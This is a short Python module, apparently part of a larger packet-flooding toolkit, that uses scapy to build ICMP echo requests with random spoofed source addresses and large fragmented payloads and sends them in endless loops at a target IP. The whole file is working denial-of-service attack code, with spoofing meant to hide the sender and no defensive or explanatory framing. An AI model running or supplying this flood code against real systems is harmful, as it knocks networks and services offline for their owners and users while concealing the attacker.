from scapy.all import IP, ICMP, fragment, send, RandIP, RandShort
from sys import path
path.append("..")
import packet_builder

def build_icmp_packet(destination_IP):
    """Generate ICMP ECHO request with spoofed source IP address.
    
    Argument:
    destination_IP -- the IP address of the target

    """
    return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload()

def build_fragmented_icmp_packet(destination_IP):
    """Generate fragmented ICMP packet with spoofed source IP address.
    
    Arguments:
    destination_IP -- the IP address of the target

    """
    return fragment(IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())

def start_icmp_flood(destination_IP):
    """Continuously send ICMP ECHO packets"""
    try:
        while True:
            send(build_icmp_packet(destination_IP), inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")

def start_fragmented_icmp_flood(destination_IP):
    """Continuously send fragmented ICMP packets"""
    try:
        while True:
            for frag in build_fragmented_icmp_packet(destination_IP):
                send(frag, inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")